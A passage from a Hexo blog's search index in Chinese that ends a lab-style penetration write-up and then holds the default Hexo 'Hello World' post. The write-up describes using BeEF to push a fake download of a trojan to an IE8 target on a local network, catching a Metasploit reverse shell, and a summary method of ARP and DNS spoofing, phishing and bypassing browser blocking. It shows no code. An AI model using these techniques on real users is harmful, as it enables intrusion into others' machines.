src="https://img-blog.csdnimg.cn/783acd8b1082450f952b498ba1ab9ea9.png#pic_center" alt="在这里插入图片描述"><br>可以看到目标机已经出现（192.168.241.136）浏览器用的是ie8,接下来对他进行文件欺骗<br><img src="https://img-blog.csdnimg.cn/73e91cad699f4ce296f7ee9892108877.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>这里有两个下载提示，一个是我用beef伪造给用户并且不会被浏览器拦截的文件(没错，这个就是我们开头做的木马)，一个是社会工程学工具包HTA攻击伪造的文件，会被拦截，而且后面无法反弹shell（试了n次）。<br><img src="https://img-blog.csdnimg.cn/6c7f1c85f393471abecf1ac2890e9483.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>运用beef功能，给目标一个提示，忽哟目标下载运行，<br>一旦目标运行，msf就会收到反弹回来shell连接<br><img src="https://img-blog.csdnimg.cn/9e078ae6303d4b718c1137bc7ca1fa2c.png#pic_center" alt="在这里插入图片描述"><br>直接输入shell，在看ip，正是目标机：<br><img src="https://img-blog.csdnimg.cn/b5210f39ce8645fabe366519a1e8e0d7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>接下来就是提权了</p><hr /><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><font color=#999AAA >同个局域网内，首先进行主机发掘，选定目标对其进行arp欺骗，然后对其流量分析，想尽办法与目标主机交互，在发现没有正面攻击手段时，可以选择DNS欺骗，对目标外出流量进行拦截和欺骗，想方设法使其访问我们的钓鱼网站或下载木马文件，绕过浏览器拦截极其重要。</p>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2021/09/18/hello-world/"/>
    <url>/2021/09/18/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
